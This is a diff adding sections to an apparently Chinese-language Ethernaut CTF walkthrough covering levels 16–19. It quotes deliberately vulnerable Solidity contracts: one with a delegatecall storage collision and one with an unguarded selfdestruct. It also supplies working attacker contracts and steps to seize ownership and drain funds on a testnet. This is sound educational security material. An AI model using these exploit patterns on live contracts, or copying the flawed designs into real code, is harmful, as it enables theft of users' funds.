@@ -210,3 +210,178 @@ import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2
   addr='0x5B38Da6a701c568545dCfcB03FcB875f56beddC4'
   1. contract.approve(player,val)
   2. contract.transferFrom(player,addr,val)
+
+## 16 Preservation
+这关是对delegatecall漏洞的考查，大家可以看我对delegatecall的另一篇文章[delegatecall杂谈](../Delegatecall.html)
+先看代码：
+```
+/ SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Preservation {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+  // Sets the function signature for delegatecall
+  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
+    timeZone1Library = _timeZone1LibraryAddress; 
+    timeZone2Library = _timeZone2LibraryAddress; 
+    owner = msg.sender;
+  }
+ 
+  // set the time for timezone 1
+  function setFirstTime(uint _timeStamp) public {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+
+  // set the time for timezone 2
+  function setSecondTime(uint _timeStamp) public {
+    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+
+  // stores a timestamp 
+  uint storedTime;  
+
+  function setTime(uint _time) public {
+    storedTime = _time;
+  }
+}
+```
+由于delegatecall的执行环境是当前合约，所以如果要调用的函数内有修改变量的操作，将会导致自身的**对应储存位上**的变量被恶意修改，具体可以参考我的另一篇博客。<br/>
+利用这一点，我们可以实现攻击：
+```
+pragma solidity ^0.6.0;
+
+contract attack {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint _time) public {
+        owner = address(_time);
+    }
+```
+由于在perservation里，owner是在第2个存储位，所以我们这里需要两个变量来"占位",这样就可以做到恶意修改被攻击合约的owner的目的。
+
+* 解题步骤
+1. 执行`setFirstTime`函数，将我们的攻击合约地址作为参数传进去，可以看到此时timeZone1Library已经变为我们攻击合约的地址。
+![](../images/ethernaut/e16/1.jpg)
+![](../images/ethernaut/e16/2.jpg)
+2. 再次执行`setFirstTime`，此时调用的就是我们的攻击合约了，我们只需要把我们自己的地址作为参数传进去，就可以完成攻击。
+
+## 17 Recovery
+这关考查对区块链浏览器的使用和destroy函数
+先看代码
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
+
+contract Recovery {
+
+  //generate tokens
+  function generateToken(string memory _name, uint256 _initialSupply) public {
+    new SimpleToken(_name, msg.sender, _initialSupply);
+  
+  }
+}
+
+contract SimpleToken {
+
+  using SafeMath for uint256;
+  // public variables
+  string public name;
+  mapping (address => uint) public balances;
+
+  // constructor
+  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
+    name = _name;
+    balances[_creator] = _initialSupply;
+  }
+
+  // collect ether in return for tokens
+  receive() external payable {
+    balances[msg.sender] = msg.value.mul(10);
+  }
+
+  // allow transfers of tokens
+  function transfer(address _to, uint _amount) public { 
+    require(balances[msg.sender] >= _amount);
+    balances[msg.sender] = balances[msg.sender].sub(_amount);
+    balances[_to] = _amount;
+  }
+
+  // clean up after ourselves
+  function destroy(address payable _to) public {
+    selfdestruct(_to);
+  }
+}
+```
+题目中给到了一个合约地址，是`Recovery`的地址，题目中说创建者通过Recovery创建了一个SimpleToken，然后把地址给忘了，要我们找到这个地址并且把里面的钱弄出来。很容易，通过区块链浏览器就可以找到他创建的`SimpleToken`。<br/>
+在 https://rinkeby.etherscan.io/ 上搜索Recovery的地址，然后我们就可以看到他的创建合约交易，点进去就可以找到合约地址。
+![](../images/ethernaut/e17/1.jpg)
+得到地址后，我们只需要执行合约的自毁函数即可<br/>
+攻击合约：
+```
+pragma solidity ^0.6.0;
+contract attack{
+    address payable target;
+    address payable owner;
+    constructor(address payable _target, address payable _own) public{
+        target = _target;
+        owner = _own;
+    }
+
+    function dosome() public {
+        target.call(abi.encodeWithSignature("destroy(address)",owner));
+    }
+}
+```
+>在执行dosome()方法的时候最好把交易的gaslimit调高一点，我在执行时如果不调gaslimit是会执行失败的，如图：
+![](../images/ethernaut/e17/2.jpg)
+
+## 18 Magic Number
+这是一个考察solidity操作码的题目
+先看代码：
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract MagicNum {
+
+  address public solver;
+
+  constructor() public {}
+
+  function setSolver(address _solver) public {
+    solver = _solver;
+  }
+
+  /*
+    ____________/\\\_______/\\\\\\\\\_____        
+     __________/\\\\\_____/\\\///////\\\___       
+      ________/\\\/\\\____\///______\//\\\__      
+       ______/\\\/\/\\\______________/\\\/___     
+        ____/\\\/__\/\\\___________/\\\//_____    
+         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+          _\///////////\\\//____/\\\/___________  
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+            ___________\///_____\///////////////__
+  */
+}
+```
+部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42。
+因此我们必须使用字节码手动编写一个程序
+
+## 19 Alien Codex
+又是一道关于内存布局的题目
